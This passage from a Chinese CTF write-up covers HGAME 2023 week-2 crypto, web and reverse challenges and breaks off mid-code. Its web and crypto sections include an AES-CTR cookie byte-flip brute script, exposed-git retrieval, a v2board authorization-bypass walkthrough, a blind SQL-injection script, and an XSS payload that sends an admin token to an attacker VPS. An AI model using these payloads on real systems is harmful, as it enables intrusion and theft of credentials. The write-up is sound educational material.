class="keyword">func</span> <span class="title">buyController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	method := c.Request.Method</span><br><span class="line">	token, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusForbidden, <span class="string">&quot;没有身份的人可不能来这儿买东西。&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	jsonUser, err := util.Decrypt(token)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	User := user.User&#123;&#125;</span><br><span class="line">	err = json.Unmarshal([]<span class="type">byte</span>(jsonUser), &amp;User)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	name := User.Name</span><br><span class="line">	<span class="keyword">if</span> method != http.MethodGet &#123;</span><br><span class="line">		c.String(http.StatusMethodNotAllowed, fmt.Sprintf(<span class="string">&quot;your method: %s. but only get method allowed&quot;</span>, method))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		product := c.Query(<span class="string">&quot;prod&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> product == <span class="string">&quot;flag&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> name != <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">				c.String(http.StatusOK, <span class="string">&quot;flag 可是特地为兔兔准备的！&quot;</span>)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				file, _ := os.Open(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">				flag, _ := io.ReadAll(file)</span><br><span class="line">				c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully\n%s&quot;</span>, name, product, flag))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully&quot;</span>, name, product))</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要token里userName值为 <code>Vidar-Tu</code>，但不能直接输入 <code>Vidar-Tu</code>。</p><p>查看 <code>util/util.go</code> 里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">var</span> iv = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	_, _ = rand.Read(key)</span><br><span class="line">	_, _ = rand.Read(iv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encrypt</span><span class="params">(u <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	plainText := []<span class="type">byte</span>(u)</span><br><span class="line">	blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">	cipherText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(plainText))</span><br><span class="line">	blockMode.XORKeyStream(cipherText, plainText)</span><br><span class="line">	<span class="keyword">return</span> base64.StdEncoding.EncodeToString(cipherText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(cipherText <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	decodeData, err := base64.StdEncoding.DecodeString(cipherText)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;invalid base64&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">	plainText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(decodeData))</span><br><span class="line">	blockMode.XORKeyStream(plainText, decodeData)</span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(plainText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token的使用AES-CTR模式加密生成，而在CTR模式中， 有一个自增的算子（IV，后四个字节相当于计数器，每次计算递增），这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密，即 $m \oplus \text{keystream} = c$。</p><p>用户名和token为一一对应关系，输入 <code>Vidar-Tv</code> 和 <code>Vidar-Tw</code> 获取对应token的base64字符串，找到改变的字符，爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">    token = <span class="string">f&#x27;NnL3arZc7tt+ezcky+B8fF<span class="subst">&#123;k&#125;</span>75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27;</span></span><br><span class="line">    r = s.get(url, cookies=&#123;<span class="string">&#x27;token&#x27;</span>:quote(token)&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Vidar-Tu&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(k,quote(token),r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully</span></span><br></pre></td></tr></table></figure><p>修改cookie中的token，购买flag，得到flag：<code>hgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;</code>。</p><p>​</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><blockquote><p>电视剧里的黑客?真正的黑客！</p></blockquote><p>题目即提示，git泄露。</p><p>访问 <code>http://HOST:PORT/.git/</code>，使用wget下载git目录：</p><p><code>wget -r http://week-2.hgame.lwsec.cn:31765/.git/</code></p><p>进入 <code>.git/logs</code>，使用 <code>git reflog</code> 查看所有分支的所有操作记录（包括已经被删除的 commit 记录和 reset 的操作）；</p><p>选择需要查看的记录，<code>git show 1dd69e2</code> 拿到flag：<code>hgame&#123;Don&#39;t^put*Git-in_web_directory&#125;</code>。</p><p>​</p><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><blockquote><p>请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。</p></blockquote><p>v2board存在越权漏洞，参考<a target="_blank" rel="noopener" href="https://www.ctfiot.com/88960.html">v2board越权漏洞复现</a>。</p><p>首先注册一个普通用户账号，然后通过 <code>http://HOST:PORT/api/v1/passport/auth/login</code> 接口登录该账号，会返回一个 <code>auth_data</code> 值；</p><p>然后访问 <code>http://HOST:PORT/api/v1/user/login</code> 接口，并将上述获得的 <code>auth_data</code> 作为authorization头发送，让服务器将普通用户的Authorization头写入缓存中；</p><p>最后只要带上这个Authorization头即可访问所有的管理员接口。</p><p>访问 <code>http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1</code>，得到flag：<code>hgame&#123;39d580e71705f6abac9a414def74c466&#125;</code>。</p><p>​</p><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><blockquote><p>R1esbyfe给兔兔写了一个简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货）</p><p>R1esbyfe:”面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码”</p><p>貌似R1esbyfe还藏了点惊喜，你能帮助兔兔找到它吗？</p><p>(数据库启动需要时间，若出现Internal Error，需要稍等片刻)</p><p>HINTS:</p><p>密码是弱密码，可以自己找个dict爆破一下</p></blockquote><p>根据hint猜密码 <code>admin123</code>，sql注入，fuzz发现过滤了空格、select、database、or、等号、大小于号等关键字。关键字改大写，等号改 <code>regexp</code> 绕过。</p><p>布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits+string.ascii_letters+<span class="string">&#x27;&#123;&#125;-_?!,&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;</span></span><br><span class="line">now = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(DATABASE())&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27;</span></span><br><span class="line">        sql = <span class="string">&#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;))&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">        cookie = &#123;<span class="string">&#x27;SESSION&#x27;</span>:<span class="string">&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;</span>&#125;</span><br><span class="line">        r = s.post(url,data=data,cookies=cookie)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            now += j</span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># database: se4rch</span></span><br><span class="line"><span class="comment"># table: 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># column: f14gggg1shere</span></span><br><span class="line"><span class="comment"># 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</code>。</p><p>​</p><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><blockquote><p>Come and design your button</p></blockquote><p>在 <code>index.js</code> 中 <code>/button/share</code> 路由会调用 <code>/button/preview</code> 路由：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>测试发现 <code>/button/preview</code> 路由存在XSS注入，尝试XSS请求伪造：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;));</span><br><span class="line">url=<span class="string">&quot;http://VPS-IP/x.php?token=&quot;</span>+<span class="title class_">String</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line"><span class="keyword">var</span> xhr2=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr2.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">xhr2.<span class="title function_">send</span>(<span class="string">&quot;token&quot;</span>);</span><br></pre></td></tr></table></figure><p>admin点击后，生成正确token，发送到VPS的apache日志中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot;</span><br></pre></td></tr></table></figure><p>解析jwt，得到flag：<code>hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;</code>。</p><p>​</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>在 <code>sub_558AEC339229()</code> 中使用 <code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code> 机制将base64码表修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_558AEC339229</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;qword_558AEC33C020, <span class="string">&quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x636D79474568756A</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再解码即可，flag：<code>hgame&#123;s0meth1ng_run_befOre_m@in&#125;</code>。</p><p>​</p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><blockquote><p>兔兔假期前学习了编程，你能看出来他学的是什么语言吗</p></blockquote><p>python程序逆向，使用pyinstxtractor将exe解包得到 <code>stream.pyc</code> 文件，再用uncompyle6反编译，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: stream.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">            tmp = s[i]</span><br><span class="line">            s[i] = s[j]</span><br><span class="line">            s[j] = tmp</span><br><span class="line">            data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(text, gen(key)):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line">        result = base64.b64encode(result.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;Flag: &#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = encrypt(text, key)</span><br><span class="line"><span class="keyword">if</span> enc == <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">None</span>(<span class="string">&#x27;try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>识别为RC4加密算法，cyberchef解出flag：<code>hgame&#123;python_reverse_is_easy_with_internet&#125;</code>。</p><p>​</p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>由于兔兔的学校提前放假，开学才能期末考试，于是兔兔开始了他的寒假期末复习~</p></blockquote><p>实际为解非齐次线性方程组，矩阵乘法逆运算，这里使用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [<span class="number">126</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">216</span>, <span class="number">253</span>, <span class="number">20</span>, <span class="number">124</span>, <span class="number">232</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">23</span>, <span class="number">100</span>, <span class="number">161</span>, <span class="number">36</span>, <span class="number">118</span>, <span class="number">21</span>, <span class="number">184</span>, <span class="number">26</span>, <span class="number">142</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">186</span>, <span class="number">82</span>, <span class="number">79</span>]</span><br><span class="line">out = [<span class="number">0</span>] * <span class="built_in">len</span>(x)</span><br><span class="line">c = [<span class="number">63998</span>, <span class="number">33111</span>, <span class="number">67762</span>, <span class="number">54789</span>, <span class="number">61979</span>, <span class="number">69619</span>, <span class="number">37190</span>, <span class="number">70162</span>, <span class="number">53110</span>, <span class="number">68678</span>, <span class="number">63339</span>, <span class="number">30687</span>, <span class="number">66494</span>, <span class="number">50936</span>, <span class="number">60810</span>, <span class="number">48784</span>, <span class="number">30188</span>, <span class="number">60104</span>, <span class="number">44599</span>, <span class="number">52265</span>, <span class="number">43048</span>, <span class="number">23660</span>, <span class="number">43850</span>, <span class="number">33646</span>, <span 